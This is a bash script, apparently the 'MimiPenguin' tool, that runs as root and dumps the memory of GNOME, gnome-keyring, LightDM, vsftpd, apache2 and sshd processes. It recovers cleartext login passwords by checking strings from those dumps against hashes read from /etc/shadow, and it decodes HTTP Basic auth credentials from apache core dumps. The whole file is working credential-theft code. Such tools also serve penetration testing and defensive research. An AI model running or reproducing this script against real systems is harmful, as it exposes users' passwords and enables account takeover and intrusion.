#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal Twitter: /huntergregal Site: huntergregal.com
# Dumps cleartext credentials from memory

#root check
if [[ "$EUID" -ne 0 ]]; then
    echo "Root required - You are dumping memory..."
    echo "Even mimikatz requires administrator"
    exit 1
fi

#Store results to cleanup later
export RESULTS=""

# check if a command exists in $PATH
command_exists () {

  command -v "${1}" >/dev/null 2>&1
}

# check for required executables in $PATH
if ! command_exists strings; then
    echo "Error: command 'strings' not found in ${PATH}"
    exit 1
fi
if ! command_exists grep; then
    echo "Error: command 'grep' not found in ${PATH}"
    exit 1
fi

# Check for any of the currently tested versions of Python
if command_exists python2; then
    pycmd=python2
elif command_exists python2.7; then
    pycmd=python2.7
elif command_exists python3; then
    pycmd=python3
elif command_exists python3.6; then
    pycmd=python3.6
elif command_exists python3.7; then
    pycmd=python3.7
else
    echo "Error: No supported version of 'python' found in ${PATH}"
    exit 1
fi

# $1 = PID, $2 = output_file, $3 = operating system
function dump_pid () {

    system=$3
    pid=$1
    output_file=$2
    if [[ $system == "kali" ]]; then
        mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | grep -E 'heap|stack' | cut -d' ' -f 1)
    else
        mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1)
    fi
    while read -r memrange; do
        memrange_start=$(echo "$memrange" | cut -d"-" -f 1)
        memrange_start=$(printf "%u\n" 0x"$memrange_start")
        memrange_stop=$(echo "$memrange" | cut -d"-" -f 2)
        memrange_stop=$(printf "%u\n" 0x"$memrange_stop")
        memrange_size=$((memrange_stop - memrange_start))
        dd if=/proc/"$pid"/mem of="${output_file}"."${pid}" ibs=1 oflag=append conv=notrunc \
            skip="$memrange_start" count="$memrange_size" > /dev/null 2>&1
    done <<< "$mem_maps"
}



# $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
function parse_pass () {

    #If hash not in dump get shadow hashes
    if [[ ! "$2" ]]; then
            SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
    fi

    #Determine password potential for each word
    while read -r line; do
        #If hash in dump, prepare crypt line
        if [[ "$2" ]]; then
            #get ctype
            CTYPE="$(echo "$2" | cut -c-3)"
            #Escape quotes, backslashes, single quotes to pass into crypt
            SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
            CRYPT="\"$SAFE\", \"$CTYPE$3\""
            if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$2" ]]; then
                #Find which user's password it is (useful if used more than once!)
                USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
                export RESULTS="$RESULTS$4          $USER:$line \n"
            fi
        #Else use shadow hashes
        elif [[ $SHADOWHASHES ]]; then
            while read -r thishash; do
                CTYPE="$(echo "$thishash" | cut -c-3)"
                SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
                #Escape quotes, backslashes, single quotes to pass into crypt
                SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
                CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
                if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$thishash" ]]; then
                    #Find which user's password it is (useful if used more than once!)
                    USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
                    export RESULTS="$RESULTS$4          $USER:$line\n"
                fi
            done <<< "$SHADOWHASHES"
        #if no hash data - revert to checking probability
        else
        patterns=("^_pammodutil.+[0-9]$"\
                 "^LOGNAME="\
                 "UTF-8"\
                 "^splayManager[0-9]$"\
                 "^gkr_system_authtok$"\
                 "[0-9]{1,4}:[0-9]{1,4}:"\
                 "Manager\.Worker"\
                 "/usr/share"\
                 "/bin"\
                 "\.so\.[0-1]$"\
                 "x86_64"\
                 "(aoao)"\
                 "stuv")
        export RESULTS="$RESULTS[HIGH]$4            $line\n"
        for pattern in "${patterns[@]}"; do
          if [[ $line =~ $pattern ]]; then
            export RESULTS="$RESULTS[LOW]$4         $line\n"
          fi
        done
        fi
    done <<< "$1"
} # end parse_pass


#Support Kali
if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
    SOURCE="[SYSTEM - GNOME]"
    #get gdm-session-worker [pam/gdm-password] process
    PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk -F ' ' '{ print $1 }')"
    #if exists aka someone logged into gnome then extract...
    if [[ $PID ]];then
        while read -r pid; do
            dump_pid "$pid" /tmp/dump "kali"
            HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
            DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | grep -E '^gkr_system_authtok$' -B 5 -A 5)"
            #Remove dupes to speed up processing
            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
    
            #cleanup
            rm -rf "/tmp/dump.${pid}"
        done <<< "$PID"
    fi
fi

#Support gnome-keyring
if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then

        SOURCE="[SYSTEM - GNOME]"
        #get /usr/bin/gnome-keyring-daemon process
        PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk -F ' ' '{ print $1 }')"

    #if exists aka someone logged into gnome then extract...
    if [[ $PID ]];then
        while read -r pid; do
            dump_pid "$pid" /tmp/dump
            HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            DUMP=$(strings "/tmp/dump.${pid}" | grep -E '^.+libgck\-1\.so\.0$' -B 10 -A 10)
            DUMP+=$(strings "/tmp/dump.${pid}" | grep -E -A 5 -B 5 'libgcrypt\.so\..+$')
            #Remove dupes to speed up processing
            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
            #cleanup
            rm -rf "/tmp/dump.${pid}"
        done <<< "$PID"
    fi
fi

#Support LightDM
if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; then
    SOURCE="[SYSTEM - LIGHTDM]"
    PID="$(ps -eo pid,command | grep lightdm | sed -rn '/session\-child/p' | awk -F ' ' '{ print $1 }')"

    #if exists aka someone logged into lightdm then extract...
    if [[ $PID ]]; then
        while read -r pid; do
            dump_pid "$pid" /tmp/dump
            HASH=$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')
            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getspnam_' -A1)"
            #Remove dupes to speed up processing
            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
            #cleanup
            rm -rf "/tmp/dump.${pid}"
        done <<< "$PID"
    fi
fi

#Support VSFTPd - Active Users
if [[ -e "/etc/vsftpd.conf" ]]; then
        SOURCE="[SYSTEM - VSFTPD]"
        #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
        PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk -F ' ' '{ print $1 }')"
    #if exists aka someone logged into FTP then extract...
    if [[ $PID ]];then
        while read -r pid; do
            dump_pid "$pid" /tmp/vsftpd
            HASH="$(strings "/tmp/vsftpd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            DUMP=$(strings "/tmp/vsftpd.${pid}" | grep -E -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
            #Remove dupes to speed up processing
            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
        done <<< "$PID"

        #cleanup
        rm -rf /tmp/vsftpd*
    fi
fi

#Support Apache2 - HTTP BASIC AUTH
if [[ -e "/etc/apache2/apache2.conf" ]]; then
        SOURCE="[HTTP BASIC - APACHE2]"
        #get all apache workers /usr/sbin/apache2 -k start
        PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
    #if exists aka apache2 running
    if [[ "$PID" ]];then
        #Dump all workers
        while read -r pid; do
            gcore -o /tmp/apache "$pid" > /dev/null 2>&1
            #without gcore - VERY SLOW!
            #dump_pid $pid /tmp/apache
        done <<< "$PID"
        #Get encoded creds
        DUMP="$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
        #for each extracted b64 - decode the cleartext
        while read -r encoded; do
            CREDS="$(echo "$encoded" | base64 -d)"
            if [[ "$CREDS" ]]; then
                export RESULTS="$RESULTS$SOURCE         $CREDS\n"
            fi
        done <<< "$DUMP"
        #cleanup
        rm -rf /tmp/apache*
    fi
fi

#Support sshd - Search active connections for Sudo passwords
if [[ -e "/etc/ssh/sshd_config" ]]; then
    SOURCE="[SYSTEM - SSH]"
    #get all ssh tty/pts sessions - sshd: user@pts01
    PID="$(ps -eo pid,command | grep -E 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
    #if exists aka someone logged into SSH then dump
    if [[ "$PID" ]];then
        while read -r pid; do
            dump_pid "$pid" /tmp/sshd
            HASH="$(strings "/tmp/sshd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            DUMP=$(strings "/tmp/sshd.${pid}" | grep -E -A 3 '^sudo.+')
            #Remove dupes to speed up processing
            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
        done <<< "$PID"
        #cleanup
        rm -rf /tmp/sshd.*
    fi
fi

#Output results to STDOUT
printf "MimiPenguin Results:\n"
printf "%b" "$RESULTS" | sort -u
unset RESULTS
